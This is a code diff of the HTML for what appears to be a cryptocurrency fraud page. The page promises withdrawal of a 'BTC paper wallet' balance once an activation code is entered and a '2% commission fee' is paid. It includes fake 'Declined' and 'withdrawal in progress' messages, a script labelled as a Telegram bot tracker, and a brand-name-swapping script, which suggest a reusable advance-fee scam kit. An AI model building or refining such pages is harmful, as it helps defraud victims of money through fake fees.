@@ -178,14 +178,13 @@
       });
     </script>
     <div class="email-receive">
-      <p>To withdraw the full amount from the BTC paper wallet,please enter activation code from your email and press
-        GET FUNDS button</p>
+      <p>To withdraw the full amount from your paper BTC wallet, enter the activation code from your email in the next step</p>
     </div>
 
     <p class="text-danger text-center">Attention!<br>
       Please,double check the commission fee is paid and confirmed in blockchain</p>
 
-    <form class="email-confirm mt-5">
+    <!-- <form class="email-confirm mt-5">
       <div class="email-confirm__field">
         <div class="email-confirm__main">
           <label style="    font-weight: 400;
@@ -193,20 +192,20 @@
           <input required id="private_bitcoin_wallet" type="text">
         </div>
         <img src="./img/printyourwallet_logo.png" alt="">
-      </div>
+      </div> -->
 
-      <div style="max-width: 750px;margin-left: auto;margin-right: auto;margin-bottom: 5px;" class="hiden-text">
+    <!-- <div style="max-width: 750px;margin-left: auto;margin-right: auto;margin-bottom: 5px;" class="hiden-text">
         <span class="text-auto" style="color:rgba(0, 0, 0, 0.623)">*In the next step enter the address of your private
           Bitcoin
           wallet</span>
-      </div>
-      <br>
-      <div class="get-found-button"></div>
-      <p id="data_ok" class="email-confirm__danger text-center text-danger mt-2 data_ok">Declined! <br>2% commission fee
-        not paid</p>
-      <p id="wait" class="check-balance__wait">Withdrawal of the wallet balance in progress...</p>
-      <p id="incorrect_data" class="email-confirm__danger text-center text-danger mt-2 incorrect_error">Please, enter
-        activation code</p>
+      </div> -->
+    <br>
+    <div class="get-found-button"></div>
+    <p id="data_ok" class="email-confirm__danger text-center text-danger mt-2 data_ok">Declined! <br>2% commission fee
+      not paid</p>
+    <p id="wait" class="check-balance__wait">Withdrawal of the wallet balance in progress...</p>
+    <p id="incorrect_data" class="email-confirm__danger text-center text-danger mt-2 incorrect_error">Please, enter
+      activation code</p>
 
 
     </form>
@@ -366,7 +365,8 @@
   <script src="assets/js/getPrices.js"></script>
   <!-- telegram bot -->
   <script src="assets/js/withdrawTracker-4.js"></script>
-  <script src="assets/js/loader.js"></script>
+  <script type="module" src="assets/js/loader.js"></script>
+  <script src="assets/js/dropdown.js"></script>
   <script src="assets/js/setBrandName.js"></script>
   <script>
     (function (u) {
